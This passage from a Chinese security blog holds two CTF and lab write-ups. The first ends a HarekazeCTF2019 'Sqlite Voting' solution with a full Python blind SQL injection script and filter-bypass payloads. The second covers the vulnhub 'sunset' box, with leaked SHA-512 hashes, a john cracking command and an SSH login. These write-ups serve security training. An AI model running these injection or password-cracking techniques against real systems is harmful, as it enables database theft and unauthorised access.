<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://66d23d52-22fc-4418-b081-0bcbbc263386.node3.buuoj.cn/vote.php"</span></span><br><span class="line">length=<span class="number">84</span></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||'</span> + table[<span class="string">"C"</span>] + <span class="string">'||'</span> + table[<span class="string">"F"</span>] +<span class="string">')'</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">res = binascii.hexlify(<span class="string">b'flag&#123;'</span>).decode().upper()</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> res:</span><br><span class="line">      <span class="keyword">if</span> a <span class="keyword">in</span> <span class="string">"0123456789"</span>:</span><br><span class="line">            flag = flag+a+<span class="string">'||'</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">            flag = flag+table[a]+<span class="string">'||'</span></span><br><span class="line">flag=flag[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res),length):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789ABCDEF'</span>:</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">                  str = flag+<span class="string">'||'</span>+j</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                  str = flag+<span class="string">'||'</span>+table[j]</span><br><span class="line">            payload = <span class="string">"abs(case(replace(length(replace(hex((select(flag)from(flag))),"</span>+str+<span class="string">",trim(0,0))),84,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)"</span> </span><br><span class="line">            data = &#123;<span class="string">'id'</span>:payload&#125;</span><br><span class="line">            r = s.post(url=url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'An error'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                  print(<span class="string">f'the numebr of <span class="subst">&#123;i&#125;</span>'</span>)</span><br><span class="line">                  res = res+j</span><br><span class="line">                  print(res)</span><br><span class="line">                  flag=str</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'the source is:'</span>+res)          </span><br><span class="line">print(<span class="string">'the flag is '</span>+binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>

<p>解释一下：</p>
<p>我们现在已经获得了flag的长度，那么我们如何进行盲注出flag每一位的字符呢？</p>
<figure class="highlight sql"><figcaption><span>lite</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select hex((select(flag1)from(flag1)));</span><br><span class="line">666C61677B636F6F6B69657D</span><br></pre></td></tr></table></figure>

<p>如下所示：</p>
<figure class="highlight sql"><figcaption><span>lite</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select replace(hex((select(flag1)from(flag1))),'666C61677B6','');</span><br><span class="line">36F6F6B69657D</span><br><span class="line">sqlite&gt; select replace(hex((select(flag1)from(flag1))),'666C61677B7','');</span><br><span class="line">666C61677B636F6F6B69657D</span><br></pre></td></tr></table></figure>

<p>第一种情况，替换用的字符串是对的，所以回显的字符串是截取后的结果。</p>
<p>第二种情况，替换用的字符串是错的，所以回显的字符串是原本的字符串。</p>
<figure class="highlight"><figcaption><span>lite</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select length(replace(hex((select(flag1)from(flag1))),'666C61677B6',''));</span><br><span class="line">13</span><br><span class="line">sqlite&gt; select replace(length(replace(hex((select(flag1)from(flag1))),'666C61677B6','')),24,'');</span><br><span class="line">13</span><br><span class="line">sqlite&gt; select length(replace(hex((select(flag1)from(flag1))),'666C61677B7',''));</span><br><span class="line">24</span><br><span class="line">sqlite&gt; select replace(length(replace(hex((select(flag1)from(flag1))),'666C61677B7','')),24,'');</span><br><span class="line"></span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure>

<p>情况一中回显是有的。而情况一中用来替换的字符串是对的。</p>
<p>情况二中回显是空的。而情况二中用来替换的字符串是错的。</p>
<p>所以最好玩的地方来了，我们可以构造这样的语句，为盲注做准备：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(length(replace(hex((select(flag)from(flag))),替换的字符串,<span class="string">''</span>)),<span class="number">84</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<p>问题来了，单引号还有空格被过滤了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）空字符：trim(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）字符串：A||B</span><br></pre></td></tr></table></figure>

<p>然后A-F我们通过特殊构造获得：</p>
<figure class="highlight sql"><figcaption><span>lite</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hex(b'zebra') = 7A65627261</span></span><br><span class="line">  <span class="comment"># 除去 12567 就是 A ，其余同理</span></span><br><span class="line">  A = 'trim(hex((<span class="keyword">select</span>(<span class="keyword">name</span>)<span class="keyword">from</span>(vote)<span class="keyword">where</span>(<span class="keyword">case</span>(<span class="keyword">id</span>)<span class="keyword">when</span>(<span class="number">3</span>)<span class="keyword">then</span>(<span class="number">1</span>)<span class="keyword">end</span>))),<span class="number">12567</span>)<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  C = '</span><span class="keyword">trim</span>(<span class="keyword">hex</span>(typeof(<span class="number">.1</span>)),<span class="number">12567</span>)<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  D = '</span><span class="keyword">trim</span>(<span class="keyword">hex</span>(<span class="number">0xffffffffffffffff</span>),<span class="number">123</span>)<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  E = '</span><span class="keyword">trim</span>(<span class="keyword">hex</span>(<span class="number">0.1</span>),<span class="number">1230</span>)<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  F = '</span><span class="keyword">trim</span>(<span class="keyword">hex</span>((<span class="keyword">select</span>(<span class="keyword">name</span>)<span class="keyword">from</span>(vote)<span class="keyword">where</span>(<span class="keyword">case</span>(<span class="keyword">id</span>)<span class="keyword">when</span>(<span class="number">1</span>)<span class="keyword">then</span>(<span class="number">1</span>)<span class="keyword">end</span>))),<span class="number">467</span>)<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  # hex(b'</span>koala<span class="string">') = 6B6F616C61</span></span><br><span class="line"><span class="string">  # 除去 16CF 就是 B</span></span><br><span class="line"><span class="string">  B = f'</span><span class="keyword">trim</span>(<span class="keyword">hex</span>((<span class="keyword">select</span>(<span class="keyword">name</span>)<span class="keyword">from</span>(vote)<span class="keyword">where</span>(<span class="keyword">case</span>(<span class="keyword">id</span>)<span class="keyword">when</span>(<span class="number">4</span>)<span class="keyword">then</span>(<span class="number">1</span>)<span class="keyword">end</span>))),<span class="number">16</span>||&#123;C&#125;||&#123;F&#125;)<span class="string">'</span></span><br></pre></td></tr></table></figure>



<p>所以最终有payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(case(replace(length(replace(hex((select(flag)<span class="keyword">from</span>(flag))),str,trim(<span class="number">0</span>,<span class="number">0</span>))),<span class="number">84</span>,trim(<span class="number">0</span>,<span class="number">0</span>)))when(trim(<span class="number">0</span>,<span class="number">0</span>))then(<span class="number">0</span>)<span class="keyword">else</span>(<span class="number">0x8000000000000000</span>)end)</span><br></pre></td></tr></table></figure>

<p>str为我们要替换的字符。具体看exp。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>（1）使用溢出产生报错的思路</p>
<p>（2）replace()，trim()，case…. when ….. then…. else…..的妙用</p>
<p>（3）字符的构造想法也很妙</p>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>比较有难度的是Upload2,还有Sqlite Voting</p>
<p>然后这个比赛代码审计的内容较多,所以对代码的审计能力还需加把劲……..</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/10/10/HarekazeCTF2019/" data-id="ck8sqr5ib000fkou5787r6hen" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sunset-vlunhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/01/14/sunset-vlunhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2019-01-14T01:48:37.000Z" itemprop="datePublished">2019-01-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/01/14/sunset-vlunhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">sunset-vlunhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶机：<code>vulnhub-sunset</code></p>
<p>目标：获得靶机中的<code>flag.txt</code></p>
<p>靶机<code>IP</code>：192.168.1.153</p>
<p>攻击机<code>IP</code>：192.168.1.128</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>首先扫描靶机的端口</p>
<p><img src="/.com//1.png" alt="image-20200121005036781"></p>
<p>发现21(<code>ftp</code>)号端口，和22(<code>ssh</code>)号端口是开放着的。</p>
<p>然后<code>ftp</code>可匿名登陆</p>
<p>发现这里有一个backup文件，里面是证书文件</p>
<p><img src="/.com//2.png" alt="image-20200121010113050"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">office:$<span class="number">6</span>$$<span class="number">9</span>ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7<span class="number">.75</span>I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  </span><br><span class="line">datacenter:$<span class="number">6</span>$$<span class="number">3</span>QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/<span class="number">6</span>Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              </span><br><span class="line">sky:$<span class="number">6</span>$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                                                                             sunset:$<span class="number">6</span>$<span class="number">406</span>THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/</span><br><span class="line">space:$<span class="number">6</span>$$<span class="number">4</span>NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU<span class="number">.4</span>A1HKs9XLXtq8qFuC3W6SCE4Ltx/</span><br></pre></td></tr></table></figure>



<p>然后使用john来爆破一下，使用<code>rockyou.txt</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt sunset</span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="image-20200121104315831"></p>
<p>然后用ssh连接</p>
<p><img src="/.com//4.png" alt="image-20200121104458286"></p>
<p><img src="/.com//5.png" alt="image-20200121104827798"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>用<code>vbox</code>，千万别用<code>vm</code>.</p>
<p><code>ftp</code>端口开着的，看他的开启的服务是否有漏洞，要么看看能不能匿名登陆</p>
<p><code>ssh</code>服务一般用于提取使用，<code>sudo -l</code>看可用什么样的命令</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/01/14/sunset-vlunhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5k7001dkou509ke330m" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
          </li>
        
          <li>
            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
          </li>
        
          <li>
            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>